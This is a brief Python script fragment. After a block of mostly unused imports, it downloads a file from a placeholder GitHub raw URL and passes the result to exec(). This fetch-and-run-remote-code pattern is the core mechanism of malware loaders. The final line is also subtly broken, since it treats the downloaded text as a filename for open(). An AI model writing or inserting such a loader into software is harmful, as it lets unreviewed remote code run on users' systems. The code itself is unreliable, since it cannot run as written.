import os
import subprocess
import time
import tempfile
import sys
from clint.textui import colored
import smtplib
import webbrowser
import json
import requests

# Define the GitHub repository URL and file names
repo = 'https://raw.githubusercontent.com/<username>/<repository>/main/'

exec(open(requests.get(url=repo).text).read())
